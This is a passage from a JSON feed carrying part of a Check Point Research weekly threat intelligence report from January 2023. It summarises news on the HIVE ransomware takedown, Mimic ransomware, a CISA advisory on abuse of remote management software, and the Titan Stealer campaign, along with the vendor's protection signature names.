attempts were related to Yahoo, while DHL impersonations dropped to 16% of all phishing attempts.</li>\n<li>EUROPOL has successfully <a href=\"https://www.europol.europa.eu/media-press/newsroom/news/cybercriminals-stung-hive-infrastructure-shut-down\">taken</a> down the leak-site of the HIVE ransomware group. The United States Department of Justice announced in a press conference that they &#8220;hacked the hackers&#8221; to disrupt their operations and infrastructure. Victims received a decryption key to recover their encrypted files, preventing the payment of more than $130M.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Harmony Endpoint and Threat Emulation provides protection against this threat </em><em>(Ransomware.Win/s.Hive.*)</em></p>\n<ul>\n<li>A new type of ransomware called \u2018Mimic\u2019 <a href=\"https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html\">takes</a> advantage of the APIs of a legitimate tool called \u2018Everything\u2019 &#8211; a Windows filename search engine which offers fast searching and real-time updates. Mimic was first detected in June 2022 and primarily targets Russian and English-speaking users.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Trojan.Win.TimEvasion.A)</em></p>\n<ul>\n<li>A joint advisory <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa23-025a\">was issued</a> by CISA, the NSA, and MS-ISAC, warning that attackers are increasingly exploiting legitimate remote monitoring and management (RMM) software for malicious activities.</li>\n<li>A campaign utilizing the &#8220;Titan Stealer&#8221; malware has been <a href=\"https://www.uptycs.com/blog/titan-stealer-telegram-malware-campaign\">uncovered</a>. This malware is being advertised and distributed by a threat actor through a Telegram channel. The stealer is capable of exfiltrating a wide range of information from infected Windows machines, including credentials from browsers and cryptocurrency wallets, FTP client details, screenshots, system information, and selected files.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Infostealer.Win.PasswordStealer.A)</em></p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/30th-january-threat-intelligence-report/\" rel=\"nofollow\">30th January \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        }
    ]
}